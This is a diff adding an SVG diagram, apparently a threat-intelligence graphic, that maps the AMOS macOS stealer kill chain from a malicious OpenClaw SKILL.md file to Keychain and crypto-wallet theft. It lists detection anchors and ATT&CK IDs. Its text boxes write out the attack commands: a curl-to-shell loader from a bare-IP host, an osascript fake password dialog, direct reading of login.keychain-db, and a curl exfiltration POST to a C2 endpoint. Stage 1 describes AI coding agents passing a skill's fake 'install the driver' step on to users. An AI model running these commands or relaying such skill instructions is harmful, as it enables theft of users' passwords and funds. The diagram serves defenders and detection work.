@@ -1,0 +1,244 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 1280" role="img" aria-labelledby="t d">
+<title id="t">AMOS macOS stealer kill chain — OpenClaw skill delivery to wallet and Keychain theft</title>
+<desc id="d">Two-lane kill chain for AMOS / Atomic macOS Stealer delivered through a malicious OpenClaw skill. Left lane shows seven victim-Mac stages: a malicious SKILL.md ingested by an AI coding agent, an osascript fake-password dialog that captures the user password, a curl-to-shell first-stage loader, the multi-key-XOR universal Mach-O AMOS payload, direct login.keychain-db and crypto-wallet theft, ditto staging into /tmp/out.zip, and a curl multipart exfiltration POST. Right lane shows six infrastructure boxes: the AMOS malware-as-a-service family, the OpenClaw skill marketplace and affiliate publisher accounts, the openclawcli.vercel.app fake-driver lure, the 91.92.242.30 loader host, the socifiapp.com C2 report-upload endpoint, and trojanized wallet replacement apps. Critical badges flag the osascript password capture, the curl loader, the credential theft, and the exfil POST.</desc>
+<defs>
+<style><![CDATA[
+.bg { fill: #ffffff; }
+.head { font: 700 18px sans-serif; fill: #0a0a0a; }
+.meta { font: 11px sans-serif; fill: #404040; }
+.laneL { fill: #f3f7fb; stroke: #5a7da6; stroke-width: 1.2; }
+.laneR { fill: #faf3ee; stroke: #b07a3a; stroke-width: 1.2; }
+.laneLabelL { font: 700 12px sans-serif; fill: #2a4a6a; }
+.laneLabelR { font: 700 12px sans-serif; fill: #8a5520; }
+.stage { fill: #ffffff; stroke: #5a7da6; stroke-width: 1.1; }
+.stageK { fill: #fdecec; stroke: #b03030; stroke-width: 1.4; }
+.op { fill: #ffffff; stroke: #b07a3a; stroke-width: 1.1; }
+.opK { fill: #fdecec; stroke: #b03030; stroke-width: 1.4; }
+.band { fill: #f7f1eb; stroke: #c08555; stroke-width: 1.2; }
+.badge { fill: #5a7da6; }
+.badgeK { fill: #b03030; }
+.badgeR { fill: #b07a3a; }
+.badgeText { font: 700 12px sans-serif; fill: #ffffff; text-anchor: middle; }
+.label { font: 700 13px sans-serif; fill: #0a0a0a; }
+.sub { font: 11px sans-serif; fill: #303030; }
+.mono { font: 10.5px ui-monospace, "SFMono-Regular", Consolas, monospace; fill: #303030; }
+.footer { fill: #f6f6f4; stroke: #888; stroke-width: 1; }
+.footerH { font: 700 12px sans-serif; fill: #1a1a1a; }
+.footerT { font: 10.5px sans-serif; fill: #1a1a1a; }
+.arrow { stroke: #2a4a6a; stroke-width: 1.6; fill: none; }
+.arrowX { stroke: #7a3a7a; stroke-width: 1.6; fill: none; stroke-dasharray: 5 3; }
+.arrowR { stroke: #8a5520; stroke-width: 1.6; fill: none; }
+
+@media (prefers-color-scheme: dark) {
+  .bg { fill: #0d1117; }
+  .head, .label, .footerH { fill: #f0f0f0; }
+  .meta, .sub, .footerT { fill: #c8c8c8; }
+  .mono { fill: #c0d0e0; }
+  .laneL { fill: #182230; stroke: #7aa6d0; }
+  .laneR { fill: #2a2418; stroke: #d09a5a; }
+  .laneLabelL { fill: #a8c6e2; }
+  .laneLabelR { fill: #e2bf8a; }
+  .stage { fill: #1c2530; stroke: #7aa6d0; }
+  .stageK { fill: #3a1818; stroke: #e06060; }
+  .op { fill: #2a2418; stroke: #d09a5a; }
+  .opK { fill: #3a1818; stroke: #e06060; }
+  .band { fill: #2a2418; stroke: #d09a5a; }
+  .badge { fill: #7aa6d0; }
+  .badgeK { fill: #e06060; }
+  .badgeR { fill: #d09a5a; }
+  .badgeText { fill: #0d1117; }
+  .footer { fill: #1a1d22; stroke: #555; }
+  .arrow { stroke: #a8c6e2; }
+  .arrowX { stroke: #c898d0; }
+  .arrowR { stroke: #e2bf8a; }
+}
+]]></style>
+<marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
+  <path d="M0,0 L10,5 L0,10 z" fill="currentColor"/>
+</marker>
+</defs>
+
+<rect class="bg" x="0" y="0" width="880" height="1280"/>
+
+<text class="head" x="20" y="36">AMOS macOS stealer kill chain — OpenClaw skill to wallet and Keychain theft</text>
+<text class="meta" x="20" y="58">Vendor: Trend Micro + glueckkanja + Microsoft + Intego · Date: 2026-02 to 2026-05 · Cluster: AMOS MaaS · Day 33</text>
+
+<rect class="laneL" x="20" y="85" width="410" height="1080"/>
+<text class="laneLabelL" x="35" y="105">Victim Mac — Intel + Apple silicon endpoint</text>
+
+<rect class="laneR" x="450" y="85" width="410" height="1080"/>
+<text class="laneLabelR" x="465" y="105">AMOS MaaS + OpenClaw delivery infrastructure</text>
+
+<!-- Left stage 1 -->
+<rect class="stage" x="30" y="120" width="395" height="135"/>
+<circle class="badge" cx="50" cy="140" r="14"/>
+<text class="badgeText" x="50" y="144">1</text>
+<text class="label" x="74" y="144">Malicious OpenClaw SKILL.md ingested</text>
+<text class="sub" x="40" y="168">AI coding agent reads a skill with a fake prerequisite step</text>
+<text class="sub" x="40" y="184">Agent relays "install the driver" to the user as trusted setup</text>
+<text class="sub" x="40" y="200">Some models flag it; others keep nudging the manual install</text>
+<text class="mono" x="40" y="226">T1195.001</text>
+<text class="mono" x="40" y="244">lure: openclawcli.vercel.app</text>
+
+<!-- Left stage 2 (critical) -->
+<rect class="stageK" x="30" y="270" width="395" height="135"/>
+<circle class="badgeK" cx="50" cy="290" r="14"/>
+<text class="badgeText" x="50" y="294">2</text>
+<text class="label" x="74" y="294">osascript fake password dialog</text>
+<text class="sub" x="40" y="318">display dialog with hidden answer mimics a macOS prompt</text>
+<text class="sub" x="40" y="334">Captures the local password; Finder consent prompt follows</text>
+<text class="sub" x="40" y="350">This is the Gatekeeper bypass: ask, do not break trust</text>
+<text class="mono" x="40" y="376">T1056.002  T1059.002  T1204.002</text>
+<text class="mono" x="40" y="394">osascript -e 'display dialog ... hidden answer'</text>
+
+<!-- Left stage 3 (critical) -->
+<rect class="stageK" x="30" y="420" width="395" height="135"/>
+<circle class="badgeK" cx="50" cy="440" r="14"/>
+<text class="badgeText" x="50" y="444">3</text>
+<text class="label" x="74" y="444">curl-to-shell first-stage loader</text>
+<text class="sub" x="40" y="468">Fake driver fetches and pipes a remote script into bash</text>
+<text class="sub" x="40" y="484">Loader host serves 16-char payload paths on rotation</text>
+<text class="sub" x="40" y="500">Highest-fidelity process anchor in the whole chain</text>
+<text class="mono" x="40" y="526">T1059.004  T1105</text>
+<text class="mono" x="40" y="544">/bin/bash -c "$(curl -fsSL hxxp://91.92.242.30/...)"</text>
+
+<!-- Left stage 4 -->
+<rect class="stage" x="30" y="570" width="395" height="135"/>
+<circle class="badge" cx="50" cy="590" r="14"/>
+<text class="badgeText" x="50" y="594">4</text>
+<text class="label" x="74" y="594">Universal Mach-O AMOS payload</text>
+<text class="sub" x="40" y="618">Fat binary x86_64 (0x1000) + ARM64 (0x7ec000)</text>
+<text class="sub" x="40" y="634">Six obfuscation layers; multi-key length-tiered XOR strings</text>
+<text class="sub" x="40" y="650">Even /bin/zsh stored XOR-encoded and decoded at runtime</text>
+<text class="mono" x="40" y="676">T1027  T1140  T1497.001</text>
+<text class="mono" x="40" y="694">init 0x10009f384; checks "Chip: Unknown" before run</text>
+
+<!-- Left stage 5 (critical) -->
+<rect class="stageK" x="30" y="720" width="395" height="135"/>
+<circle class="badgeK" cx="50" cy="740" r="14"/>
+<text class="badgeText" x="50" y="744">5</text>
+<text class="label" x="74" y="744">Keychain and crypto-wallet theft</text>
+<text class="sub" x="40" y="768">Reads the login Keychain database directly via cat</text>
+<text class="sub" x="40" y="784">200+ hardcoded wallet extension IDs (MetaMask, Phantom...)</text>
+<text class="sub" x="40" y="800">Browser cookies, passwords, autofill; Apple + KeePass stores</text>
+<text class="mono" x="40" y="826">T1555.001  T1555.003  T1539  T1552.001</text>
+<text class="mono" x="40" y="844">cat ~/Library/Keychains/login.keychain-db</text>
+
+<!-- Left stage 6 -->
+<rect class="stage" x="30" y="870" width="395" height="135"/>
+<circle class="badge" cx="50" cy="890" r="14"/>
+<text class="badgeText" x="50" y="894">6</text>
+<text class="label" x="74" y="894">Local staging with ditto</text>
+<text class="sub" x="40" y="918">Collected loot archived into a single zip under /tmp</text>
+<text class="sub" x="40" y="934">Archive built with the signed system utility ditto</text>
+<text class="sub" x="40" y="950">Archive deleted after upload to reduce on-disk footprint</text>
+<text class="mono" x="40" y="976">T1560.001  T1074.001</text>
+<text class="mono" x="40" y="994">ditto -c -k --sequesterRsrc &lt;stage&gt; /tmp/out.zip</text>
+
+<!-- Left stage 7 (critical) -->
+<rect class="stageK" x="30" y="1020" width="395" height="135"/>
+<circle class="badgeK" cx="50" cy="1040" r="14"/>
+<text class="badgeText" x="50" y="1044">7</text>
+<text class="label" x="74" y="1044">curl multipart exfiltration POST</text>
+<text class="sub" x="40" y="1068">Staged zip uploaded as a multipart form to the C2 endpoint</text>
+<text class="sub" x="40" y="1084">Each upload tagged with user_id + build_tag per affiliate</text>
+<text class="sub" x="40" y="1100">Optional: download trojanized Ledger Live / Trezor Suite</text>
+<text class="mono" x="40" y="1126">T1041  T1071.001</text>
+<text class="mono" x="40" y="1144">curl -X POST -F report_file=@... socifiapp.com/api/...</text>
+
+<!-- Right op 1 -->
+<rect class="op" x="460" y="125" width="395" height="155"/>
+<circle class="badgeR" cx="480" cy="145" r="14"/>
+<text class="badgeText" x="480" y="149">A</text>
+<text class="label" x="504" y="149">AMOS — Atomic macOS Stealer MaaS</text>
+<text class="sub" x="470" y="173">Dominant macOS infostealer sold as a service since 2023</text>
+<text class="sub" x="470" y="189">Russian-speaking ecosystem; many affiliates, many campaigns</text>
+<text class="sub" x="470" y="205">Delivery has moved from cracked apps to ClickFix and AI skills</text>
+<text class="sub" x="470" y="221">Microsoft 2026-05-06: AMOS + MacSync + Shub via ClickFix</text>
+<text class="mono" x="470" y="246">family: AMOS / Atomic macOS Stealer</text>
+<text class="mono" x="470" y="264">aliases: OSX/Amos, Atomic Stealer</text>
+
+<!-- Right op 2 -->
+<rect class="op" x="460" y="295" width="395" height="155"/>
+<circle class="badgeR" cx="480" cy="315" r="14"/>
+<text class="badgeText" x="480" y="319">B</text>
+<text class="label" x="504" y="319">OpenClaw skill marketplace abuse</text>
+<text class="sub" x="470" y="343">Affiliate publisher accounts host malicious SKILL.md files</text>
+<text class="sub" x="470" y="359">Auto-collecting GitHub repos mix benign and malicious skills</text>
+<text class="sub" x="470" y="375">Tell-tale: a skill that runs base64 -D | bash</text>
+<text class="sub" x="470" y="391">AI-agent instruction is the new social-engineering surface</text>
+<text class="mono" x="470" y="416">publishers: thiagoruss0, stveenli, heldinhow</text>
+<text class="mono" x="470" y="434">repos: openclaw/skills, Demerzels-lab, Dive-Ai</text>
+
+<!-- Right op 3 -->
+<rect class="op" x="460" y="465" width="395" height="155"/>
+<circle class="badgeR" cx="480" cy="485" r="14"/>
+<text class="badgeText" x="480" y="489">C</text>
+<text class="label" x="504" y="489">Fake driver lure host</text>
+<text class="sub" x="470" y="513">SKILL.md tells the agent to install a "prerequisite driver"</text>
+<text class="sub" x="470" y="529">Hosted on a throwaway vercel.app subdomain</text>
+<text class="sub" x="470" y="545">Serves Windows and macOS download links from one page</text>
+<text class="sub" x="470" y="561">Bridges the agent instruction to the curl loader</text>
+<text class="mono" x="470" y="586">host: openclawcli.vercel.app</text>
+<text class="mono" x="470" y="604">lure: "Download and install (Windows, MacOS)"</text>
+
+<!-- Right op 4 (critical) -->
+<rect class="opK" x="460" y="635" width="395" height="155"/>
+<circle class="badgeK" cx="480" cy="655" r="14"/>
+<text class="badgeText" x="480" y="659">D</text>
+<text class="label" x="504" y="659">First-stage loader host</text>
+<text class="sub" x="470" y="683">Bare-IP host serving payloads under random 16-char paths</text>
+<text class="sub" x="470" y="699">curl -fsSL pulls the next stage straight into a shell</text>
+<text class="sub" x="470" y="715">Payloads are universal Mach-O AMOS builds</text>
+<text class="sub" x="470" y="731">Loader artifact hash: 5968bd7d... (ece0f208u7uqhs6x)</text>
+<text class="mono" x="470" y="756">host: 91.92.242.30</text>
+<text class="mono" x="470" y="774">paths: ece0f208u7uqhs6x, il24xgriequcys45, ...</text>
+
+<!-- Right op 5 (critical) -->
+<rect class="opK" x="460" y="805" width="395" height="155"/>
+<circle class="badgeK" cx="480" cy="825" r="14"/>
+<text class="badgeText" x="480" y="829">E</text>
+<text class="label" x="504" y="829">C2 report-upload endpoint</text>
+<text class="sub" x="470" y="853">Receives the multipart exfil POST of the staged zip</text>
+<text class="sub" x="470" y="869">Form fields user_id and build_tag attribute loot to builds</text>
+<text class="sub" x="470" y="885">glueckkanja RE sample exfils /tmp/out.zip the same way</text>
+<text class="sub" x="470" y="901">High-fidelity network anchor: POST to /api/reports/upload</text>
+<text class="mono" x="470" y="926">url: socifiapp.com/api/reports/upload</text>
+<text class="mono" x="470" y="944">field: report_file=@FILENAME.zip</text>
+
+<!-- Right op 6 -->
+<rect class="op" x="460" y="975" width="395" height="155"/>
+<circle class="badgeR" cx="480" cy="995" r="14"/>
+<text class="badgeText" x="480" y="999">F</text>
+<text class="label" x="504" y="999">Trojanized wallet replacement</text>
+<text class="sub" x="470" y="1023">Post-exfil, AMOS can swap installed wallet apps</text>
+<text class="sub" x="470" y="1039">Backdoored Ledger Live and Trezor Suite continue theft</text>
+<text class="sub" x="470" y="1055">Intego: weaponized Ledger Live Electron ASAR archive</text>
+<text class="sub" x="470" y="1071">Reinstall wallet apps only from verified vendor sources</text>
+<text class="mono" x="470" y="1096">artifact: ledger-wallet (5e4696a2...)</text>
+<text class="mono" x="470" y="1114">YARA: amos_macho_keychain_exfil_stealer</text>
+
+<!-- Vertical flow arrows inside left lane -->
+<g class="arrow" color="#2a4a6a">
+<line x1="225" y1="255" x2="225" y2="269" marker-end="url(#ah)"/>
+<line x1="225" y1="405" x2="225" y2="419" marker-end="url(#ah)"/>
+<line x1="225" y1="555" x2="225" y2="569" marker-end="url(#ah)"/>
+<line x1="225" y1="705" x2="225" y2="719" marker-end="url(#ah)"/>
+<line x1="225" y1="855" x2="225" y2="869" marker-end="url(#ah)"/>
+<line x1="225" y1="1005" x2="225" y2="1019" marker-end="url(#ah)"/>
+</g>
+
+<!-- Cross-lane arrows (Δy < 200) -->
+<g class="arrowX" color="#7a3a7a">
+<line x1="425" y1="190" x2="460" y2="330" marker-end="url(#ah)"/>
+<line x1="425" y1="487" x2="460" y2="545" marker-end="url(#ah)"/>
+<line x1="425" y1="500" x2="460" y2="690" marker-end="url(#ah)"/>
+<line x1="425" y1="1087" x2="460" y2="900" marker-end="url(#ah)"/>
+</g>
+
+<rect class="footer" x="20" y="1175" width="840" height="95"/>
+<text class="footerH" x="35" y="1200">Detection anchors</text>
+<text class="footerT" x="35" y="1220">Sigma 01 / KQL k1 — Unix shell -c wrapping a curl -fsSL fetch (curl-to-shell loader)</text>
+<text class="footerT" x="35" y="1236">Sigma 02 + 03 / KQL k2 — osascript display dialog hidden answer + direct login.keychain-db access</text>
+<text class="footerT" x="35" y="1252">Sigma 04 / KQL k3 + k4 — curl multipart POST to /api/reports/upload and egress to socifiapp.com / 91.92.242.30</text>
+</svg>
